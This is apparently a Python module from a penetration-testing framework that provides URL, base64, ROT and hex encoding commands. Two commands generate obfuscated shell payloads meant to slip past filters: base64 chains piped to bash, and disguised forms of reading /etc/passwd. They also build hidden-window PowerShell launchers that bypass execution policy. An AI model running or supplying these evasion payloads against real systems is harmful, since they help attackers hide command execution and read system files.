"""Encoding commands extracted from misc_migrated.py.

Phase misc cluster: URL/base64/rot/obfuscation helpers. Active: originals
deleted from ``cli/commands/misc_migrated.py`` and this set is registered
by ``cli.registry``.
"""

from __future__ import annotations

import base64

import cmd2

from cli.commands._base import LazyOwnCommandSet

__all__ = ["EncodingCommandSet"]


class EncodingCommandSet(LazyOwnCommandSet):
    """Encoding helpers (pending)."""

    phase = "misc"
    category = "12. Miscellaneous"

    @cmd2.with_category("12. Miscellaneous")
    def do_urlencode(self, line):
        """
        Encode a string for URL.

        This function takes a string as input, encodes it for URL compatibility using the `quote` function, and prints the encoded result.

        Usage:
            urlencode <string_to_encode>

        :param line: The string to encode for URL.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a string to be URL-encoded as an argument. The function will encode it and print the result.

        Note: If no input is provided or the input is only whitespace, an error message will be displayed.
        """

        if not line.strip():
            print_error("Please provide a string to encode.")
            return

        encoded_string = quote(line.strip())
        print_msg(encoded_string)
        copy2clip(encoded_string)
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_urldecode(self, line):
        """
        Decode a URL-encoded string.

        This function takes a URL-encoded string as input, decodes it using the `unquote` function, and prints the decoded result.

        Usage:
            urldecode <url_encoded_string>

        :param line: The URL-encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a URL-encoded string as an argument. The function will decode it and print the result.

        Note: If no input is provided or the input is only whitespace, an error message will be displayed.
        """

        if not line.strip():
            print_error("Please provide a string to decode.")
            return

        decoded_string = unquote(line.strip())
        print_msg(decoded_string)
        copy2clip(decoded_string)
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_encode(self, line):
        """
        Encodes a string using the specified shift value and substitution key.

        This function encodes the given string by applying a shift value and a substitution key.

        Usage:
            encode <shift_value> <substitution_key> <string>

        :param line: The input string containing the shift value, substitution key, and the string to be encoded. The format should be '<shift_value> <substitution_key> <string>'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a shift value (integer), a substitution key, and the string to encode in the format `encode <shift_value> <substitution_key> <string>`.

        Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.
        """

        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: encode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Encode the input string
        encoded_string = encode(input_string, shift_value, substitution_key)
        print_msg(f"Encoded string: {encoded_string}")
        decode(encoded_string, shift_value, substitution_key)
        copy2clip(encoded_string)
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_decode(self, line):
        """
        Decode a string using the specified shift value and substitution key.

        This function decodes the given string by applying a shift value and a substitution key to reverse the encoding process.

        Usage:
            decode <shift_value> <substitution_key> <string>

        :param line: The input string containing the shift value, substitution key, and the string to be decoded. The format should be '<shift_value> <substitution_key> <string>'.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a shift value (integer), a substitution key, and the string to decode in the format `decode <shift_value> <substitution_key> <string>`.

        Note: The function assumes the shift value is an integer. If the shift value is not an integer, it will print an error message.
        """
        parts = line.split(" ", 2)
        if len(parts) != 3:
            print_error("Usage: decode <shift_value> <substitution_key> <string>")
            return

        try:
            shift_value = int(parts[0])
            substitution_key = parts[1]
            input_string = parts[2]
        except ValueError:
            print_error("Error: Shift value must be an integer")
            return

        # Decode the input string
        decoded_string = decode(input_string, shift_value, substitution_key)
        print_msg(f"Decoded string: {decoded_string}")
        copy2clip(decoded_string)
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_rot(self, line):
        """
        Apply a ROT (rotation) substitution cipher to the given string.

        This function rotates each character in the input string by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.

        Usage:
            rot <number> '<string>'

        :param line: The input string containing the number and the text to be rotated. The format should be '<number> '<string>' where <number> is the rotation amount and <string> is the text to be ciphered.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a number (rotation amount) and a string in the format `rot <number> '<string>'`. Ensure the number is between 1 and 27.

        Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
        """

        parts = line.split("'", 1)
        if len(parts) != 2:
            print_error("Usage: rot <number> '<string>'")
            return

        number_str = parts[0].strip()
        text = parts[1].strip().strip("'")

        try:
            number = int(number_str)
            if not (1 <= number <= 27):
                raise ValueError("Number must be between 1 and 27.")
        except ValueError as e:
            print_error(f"Invalid number: {e}")
            return
        rotated_text = "".join(rotate_char(c, number) for c in text)

        copy2clip(rotated_text)
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_rotf(self, line):
        """
        Apply a ROT (rotation) substitution cipher to the given extension.

        This function rotates each character in the input extension by the specified number of positions in the alphabet. It supports rotation values between 1 and 27.

        Usage:
            rot <number> '<extension>'

        :param line: The input extension containing the number and the text to be rotated. The format should be '<number> '<extension>' where <number> is the rotation amount and <extension> is the text to be ciphered.
        :type line: str
        :returns: None

        Manual execution:
        To manually run this task, provide a number (rotation amount) and a extension in the format `rot <number> '<extension>'`. Ensure the number is between 1 and 27.

        Note: The function assumes that the rotation number is an integer between 1 and 27. If the number is out of range or not a valid integer, it will print an error message.
        """


        parts = line.split(" ")
        if len(parts) != 2:
            print_error("Usage: rot <number> extension example: rot 13 js")
            return

        number_str = parts[0].strip()
        ext = parts[1].strip()
        text = get_users_dic(ext)

        try:
            number = int(number_str)
            if not (1 <= number <= 27):
                raise ValueError("Number must be between 1 and 27.")
        except ValueError as e:
            print_error(f"Invalid number: {e}")
            return
        with open(text) as file:
            content = file.read().strip()
        file_name = text.replace(f".{ext}", f"_rotated_{number}.{ext}")

        rotated_text = "".join(rotate_char(c, number) for c in content)
        with open(file_name, 'w') as f:
            f.write(rotated_text)
        copy2clip(rotated_text)
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_encoderpayload(self, line):
        """
        Applies various obfuscations to a given command line string to create multiple obfuscated versions.

        1. Defines a helper function `double_base64_encode(cmd)` that performs double Base64 encoding on a given command.
        2. Defines the `apply_obfuscations(cmd)` function to create a list of obfuscated commands using different techniques.
        3. Applies these obfuscations to the provided `line` argument and prints each obfuscated command.

        :param line: The command line string to be obfuscated.
        :type line: str
        :returns: None

        Manual execution:
        To manually run these tasks, you would:
        - Provide the command you want to obfuscate as the argument to this function.
        - The function will generate various obfuscated versions of the command and print them.

        Note: Ensure that the command is properly formatted and valid to avoid errors during obfuscation. The obfuscations may involve different encoding and string manipulation techniques.
        """

        try:
            def double_base64_encode(cmd):
                """
                Perform double Base64 encoding on the given command.

                This helper function takes a command string, encodes it in Base64, and then performs
                another Base64 encoding on the result. The final encoded string is returned.

                Args:
                    cmd (str): The command string to be encoded.

                Returns:
                    str: The double Base64 encoded string.

                Example:
                    >>> double_base64_encode("example")
                    'ZWN4YW5hbWVsZQ=='

                Notes:
                    - The function first encodes the command string into bytes using UTF-8 encoding.
                    - It then applies Base64 encoding twice and removes any leading or trailing whitespace.
                    - The result is decoded back to a string and returned.

                Raises:
                    TypeError: If the input `cmd` is not a string.
                """

                return base64.b64encode(base64.b64encode(cmd.encode()).strip()).decode().strip()

            def apply_obfuscations(cmd):
                """
                Generate a list of obfuscated commands based on the given input command.

                This function creates various obfuscated versions of the provided command string.
                Each obfuscation method applies a different technique to disguise the command,
                making it less recognizable to simple static analysis.

                Args:
                    cmd (str): The command string to be obfuscated.

                Returns:
                    list of str: A list of obfuscated command strings.

                Notes:
                    - Each obfuscation method aims to transform the command in a unique way.
                    - Obfuscations include encoding, character replacement, and command substitution techniques.
                    - Ensure that the `double_base64_encode` function is defined and available in the scope where this function is used.

                Raises:
                    TypeError: If the input `cmd` is not a string.
                """
                obfuscations = [
                    f"echo \"echo $(echo '{cmd}' | base64 | base64)|base64 -d|base64 -d|bash\" | sed 's/ /${{IFS}}/g'",
                    f"echo {double_base64_encode(cmd)}|base64 -d|base64 -d|bash",
                    f"$(tr '[A-Z]' '[a-z]' <<< '{cmd}')",
                    f"$(a='{cmd}'; printf %s \"${{a,,}}\")",
                    f"$(rev <<< '{cmd}')",
                    f"bash <<< $(base64 -d <<< {base64.b64encode(cmd.encode()).decode()})",
                    f"echo {cmd} | $0",
                    "cat$u /etc$u/passwd$u",
                    "p${u}i${u}n${u}g",
                    "p\\\\i\\\n\\\\g",
                    "cat ${HOME:0:1}etc${HOME:0:1}passwd",
                    "cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd",
                    "echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"",
                    "cat $(echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\")",
                    f"abc=${'$'}'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'; cat abc",
                    "$(printf %.1s \"$PWD\")bin$(printf %.1s \"$PWD\")ls",
                    "while read -r line; do echo $line; done < /etc/passwd"
                ]
                return obfuscations

            obfuscations = apply_obfuscations(line)
            for obfuscation in obfuscations:
                print_msg(obfuscation)
                copy2clip(obfuscation)

        except Exception as e:
            print_error(f"An error occurred: {e}")

    @cmd2.with_category("12. Miscellaneous")
    def do_base64encode(self, line):
        """
        Encodes a given string into Base64 format.

        1. Encodes the input string:
            - Uses the `base64` library to encode the provided string into Base64 format.

        2. Displays the encoded string:
            - Prints the Base64 encoded string to the terminal.

        :param line: The string to encode in Base64 format.
        :type line: str
        :returns: None

        Manual execution:
        To manually encode a string in Base64:
        - Provide the string to the command and it will print the Base64 encoded result.
        Example usage: `base64encode HelloWorld`
        """
        if line:
            # Encode the input line to Base64
            encoded_bytes = base64.b64encode(line.encode('utf-8'))
            encoded_str = encoded_bytes.decode('utf-8')
            print_msg(encoded_str)
        else:
            print_error("Error: No input provided for encoding.")

    @cmd2.with_category("12. Miscellaneous")
    def do_base64decode(self, line):
        """
        Decodes a Base64 encoded string.

        1. Decodes the Base64 string:
            - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.

        2. Displays the decoded string:
            - Prints the decoded string to the terminal.

        :param line: The Base64 encoded string to decode.
        :type line: str
        :returns: None

        Manual execution:
        To manually decode a Base64 encoded string:
        - Provide the Base64 encoded string to the command and it will print the decoded result.
        Example usage: `base64decode SGVsbG9Xb3JsZA==`
        """
        if line:
            try:
                # Decode the Base64 encoded line
                decoded_bytes = base64.b64decode(line)
                decoded_str = decoded_bytes.decode('utf-8')
                print_msg(decoded_str)
            except Exception as e:
                print_error(f"Error decoding Base64 string: {e}")
        else:
            print_error("Error: No input provided for decoding.")

    @cmd2.with_category("12. Miscellaneous")
    def do_encodewinbase64(self, line):
        """
        Encodes a given payload into a Base64 encoded string suitable for Windows PowerShell execution.

        This function takes a payload as input, encodes it into UTF-16 Little Endian format,
        and then encodes the resulting bytes into a Base64 string. It then constructs PowerShell
        commands that can execute the encoded payload. The final commands are printed and
        copied to the clipboard for easy use.

        Args:
            line (str): The payload to be encoded. If not provided, the function will prompt
                        the user to enter a payload, defaulting to 'whoami' if no input is given.

        Returns:
            None

        Example:
            >>> encoder = Encoder()
            >>> encoder.do_encodewinbase64('Get-Process')
            [Outputs the encoded PowerShell commands and copies the final command to the clipboard]
        """
        if not line:
            line = input('    [!] enter the payload (default; whoami): ') or 'whoami'

        utf16_payload = line.encode('utf-16le')
        base64_payload = base64.b64encode(utf16_payload).decode('utf-8')
        final_command = f"cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}"
        final_final_command = f"cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}"
        payloads = f"""
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowStyle Hidden -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /Window Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty H -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /W Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W H -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -W Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidd -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidden -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSt Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS H -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Wind Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -Win Hid -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass -WindowSt Hidd -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowStyle Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowS Hidde -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hid -Enco {base64_payload}
        cmd.exe /c powershell.exe -ExecutionPolicy ByPass /WindowSty Hi -Enco {base64_payload}
        cmd.exe /c powershell.exe %COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -e {base64_payload}
        """

        print_msg(final_command)
        print_msg(final_final_command)
        copy2clip(final_command)
        print_msg("Another options to payloads: ")
        print_msg(f"\n\n {payloads} \n\n")
        return

    @cmd2.with_category("12. Miscellaneous")
    def do_ip2hex(self, line):
        """
        Convert an IPv4 address into its hexadecimal representation.

        This function takes an IPv4 address in standard dotted-decimal format
        (e.g., '192.168.1.1') and converts each of its four octets into a hexadecimal
        number. The resulting hexadecimal string is concatenated without separators,
        providing the full hexadecimal equivalent of the IP address.

        The input IP address is expected to be a string in the format 'X.X.X.X',
        where X is an integer between 0 and 255.

        Parameters:
        line (str): The input string representing the IPv4 address in dotted-decimal format.

        Returns:
        None: The hexadecimal equivalent of the IP address is printed to the console.
        """
        try:
            octets = line.strip().split('.')
            hex_value = ''.join([format(int(octet), '02x') for octet in octets])
            print_msg(f"Hexadecimal representation: {hex_value}")
        except ValueError:
            print_error("Invalid IP address format. Please provide a valid IPv4 address.")

    @cmd2.with_category("12. Miscellaneous")
    def do_hex_to_plaintext(self, line):
        """
        Converts hexadecimal data from a file to plain text.

        Opens a text editor for the user to paste hexadecimal data into a file.
        Then reads the file, processes the hexadecimal data, and writes the plain text to a new file.

        Args:
            line (str): Name of the file containing hexadecimal data (without extension).
                        Defaults to 'request.txt' if not provided.

        Returns:
            None
        """
        if not line:
            line = "request.txt"
        line = line.strip()
        file_request = f"sessions/{line}"

        self.cmd(f"nano {file_request}")

        with open(file_request) as file:
            hex_data = file.read()

        lines = hex_data.splitlines()
        hex_values = []

        for line in lines:
            parts = line.split()
            hex_values.extend(parts[1:])
        hex_values = [byte for byte in hex_values if len(byte) == 2]

        plaintext = ''.join(chr(int(byte, 16)) for byte in hex_values if all(c in '0123456789abcdefABCDEF' for c in byte))

        print_msg("Plain text:")
        file_plain = "sessions/request_plaintext.txt"
        with open(file_plain, 'w') as plain:
            plain.write(plaintext)

        print_msg(plaintext)
        return


import utils as _lazy_utils

for _lazy_name in dir(_lazy_utils):
    if not _lazy_name.startswith('_'):
        globals().setdefault(_lazy_name, getattr(_lazy_utils, _lazy_name))
del _lazy_utils, _lazy_name


def __getattr__(name: str):
    """Fall back to ``utils`` for bare-name references used by migrated commands."""
    import utils as _utils
    try:
        return getattr(_utils, name)
    except AttributeError:
        raise AttributeError(f"module {__name__!r} has no attribute {name!r}") from None
